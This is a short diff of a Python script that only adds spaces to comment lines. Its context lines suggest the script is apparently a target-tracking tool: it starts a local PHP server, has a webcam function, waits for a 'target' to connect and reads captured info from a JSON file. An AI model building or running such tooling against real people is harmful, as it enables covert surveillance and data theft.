@@ -13,11 +13,11 @@ try:
 except (ImportError , ModuleNotFoundError):
     subprocess.call("pip install colorama pandas" , shell=True)
     sys.exit()
-#Run localhost====================================================================================================
+#Run localhost ====================================================================================================
 def php_server():
     with open("Server" , "w") as log:
         subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
-#Change localhost to Server====================================================================================================
+#Change localhost to Server ====================================================================================================
 def loaclhost():
     global port
 
@@ -106,7 +106,7 @@ def webcam():
 
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
-#Write info====================================================================================================
+#Write info ====================================================================================================
     try:
         while True:
             size = os.stat("info.json")
